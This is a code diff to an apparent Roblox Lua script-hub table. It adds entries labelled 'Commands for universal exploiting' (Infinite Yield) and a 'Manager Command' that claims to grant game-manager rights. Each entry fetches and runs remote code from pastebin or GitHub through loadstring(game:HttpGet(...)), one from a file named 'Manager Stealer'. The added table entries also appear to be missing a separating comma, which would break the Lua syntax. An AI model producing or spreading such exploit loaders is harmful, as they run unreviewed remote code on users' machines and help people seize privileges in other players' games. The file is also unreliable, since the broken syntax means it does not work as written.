@@ -845,7 +845,6 @@ _G.Table = {
 				IsOP = false,
 				IsNew = false,
 				ScriptId = 3001,
-				Favorited = false,
 				Script = function()
 					loadstring(game:HttpGet("https://pastebin.com/raw/pYjkmxUe", true))()
 				end,
@@ -853,19 +852,31 @@ _G.Table = {
 		},
 
 		["Commands"] = {
-			["NameScriptName"] = {
-				Owner = "V31nc",
-				Description = "Hello World",
+			["Infinite Yeild"] = {
+				Owner = "edge_egg (Edge), strong.zinnia (Moon), toonarch (Toon)",
+				Description = "Commands for universal exploiting.",
 				GameId = 0,
 				RigType = "Any", -- R6, R15, Any
 				IsOP = true,
-				IsNew = true,
-				ScriptId = 0000,
-				Favorited = false,
+				IsNew = false,
+				ScriptId = 4001,
 				Script = function()
-					print("hello from commands section")
+					loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
 				end,
 			}
+
+			["Manager Command"] = {
+				Owner = "sirelKilla",
+				Description = "Makes you the manager of the game.",
+				GameId = 192800,
+				RigType = "Any", -- R6, R15, Any
+				IsOP = true,
+				IsNew = false,
+				ScriptId = 4002,
+				Script = function()
+					loadstring(game:HttpGet(('https://raw.githubusercontent.com/V31nc/Scripts/main/Manager%20Stealer'),true))()
+				end,
+			},
 		},
 
 		["Other Hubs"] = {
